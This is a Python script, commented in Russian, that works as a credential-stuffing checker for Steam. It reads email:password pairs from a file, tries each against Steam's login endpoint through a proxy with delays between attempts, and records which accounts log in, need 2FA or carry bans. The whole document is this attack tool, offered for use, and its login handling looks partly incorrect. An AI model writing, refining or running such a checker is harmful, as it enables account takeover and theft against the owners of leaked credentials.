import requests
from bs4 import BeautifulSoup
import time
from datetime import datetime

# Настройки
PROXY = {
    "http": "http://ваш_логин:ваш_пароль@ip_прокси:порт",  # Пример: "http://user:pass@123.123.123.123:8080"
    "https": "http://ваш_логин:ваш_пароль@ip_прокси:порт"
}
DELAY_SECONDS = 10  # Задержка между запросами
INPUT_FILE = "accounts.txt"  # Файл с данными в формате email:password
OUTPUT_FILE = "steam_report.txt"  # Файл для отчёта

def load_accounts(filename):
    """Загружает аккаунты из файла в формате email:password"""
    accounts = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                login, password = line.split(':', 1)
                accounts.append({"login": login.strip(), "password": password.strip()})
    return accounts

def check_steam_account(session, login, password):
    """Проверяет доступность аккаунта Steam"""
    try:
        # Получаем CSRF-токен
        login_page = session.get("https://store.steampowered.com/login", timeout=10)
        soup = BeautifulSoup(login_page.text, 'html.parser')
        rsapubkey = soup.find('input', {'name': 'rsapubkey'})['value']
        
        # Формируем данные для входа
        data = {
            "username": login,
            "password": password,
            "rsapubkey": rsapubkey,
            "remember_login": "true",
            "donotcache": str(int(time.time() * 1000)),
        }
        
        # Отправляем запрос
        response = session.post(
            "https://store.steampowered.com/login/dologin/",
            data=data,
            headers={"Referer": "https://store.steampowered.com/login"}
        ).json()
        
        # Анализируем ответ
        if response.get("success"):
            return "✅ Рабочий"
        elif "requires_twofactor" in response:
            return "⚠️ Требуется 2FA"
        elif "message" in response:
            if "VAC" in response["message"]:
                return "⛔ VAC Ban"
            elif "community ban" in response["message"].lower():
                return "⛔ Community Ban"
            return f"❌ {response['message']}"
        return "❓ Неизвестный ответ"
        
    except Exception as e:
        return f"🔴 Ошибка: {str(e)}"

def main():
    accounts = load_accounts(INPUT_FILE)
    if not accounts:
        print(f"Файл {INPUT_FILE} пуст или не найден!")
        return

    with open(OUTPUT_FILE, "a", encoding="utf-8") as f_out:
        f_out.write(f"\n\n=== Отчёт от {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        
        with requests.Session() as session:
            session.proxies = PROXY
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            })
            
            for acc in accounts:
                status = check_steam_account(session, acc["login"], acc["password"])
                report_line = f"{acc['login']}: {status}"
                print(report_line)
                f_out.write(report_line + "\n")
                f_out.flush()
                
                if DELAY_SECONDS > 0 and acc != accounts[-1]:
                    time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print(f"Загрузка аккаунтов из файла {INPUT_FILE}...")
    main()
    print(f"\nОтчёт сохранён в {OUTPUT_FILE}")